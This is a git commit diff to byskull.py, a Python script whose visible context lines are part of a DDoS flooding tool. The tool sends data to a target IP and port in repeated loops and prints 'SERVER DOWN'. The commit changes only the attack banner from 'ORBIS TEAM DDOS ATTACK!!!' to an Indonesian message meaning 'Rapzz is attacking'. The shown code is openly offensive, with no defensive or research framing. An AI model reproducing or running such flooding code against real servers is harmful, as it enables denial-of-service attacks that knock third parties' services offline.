c5966d99c6387ec18b93c1334dcc7a1535ff5f4c
Rapzzz <96895836+Rxyfaa@users.noreply.github.com>
2022-09-22 21:36:16 +0800

    Update byskull.py

--- byskull.py
+++ byskull.py
@@ -29,7 +29,7 @@ def run():
 			addr = (str(ip),int(port))
 			for x in range(times):
 				s.sendto(data,addr)
-			print(i +" ORBIS TEAM DDOS ATTACK!!!")
+			print(i +" Rapzz Sedang Menyerang!!!")
 		except:
 			print("[!] SERVER DOWN!!!")
 
@@ -43,7 +43,7 @@ def run2():
 			s.send(data)
 			for x in range(times):
 				s.send(data)
-			print(i +" ORBIS TEAM DDOS ATTACK!!!")
+			print(i +" Rapzz Sedang Menyerang!!!")
 		except:
 			s.close()
 			print("[*] SERVER DOWN")
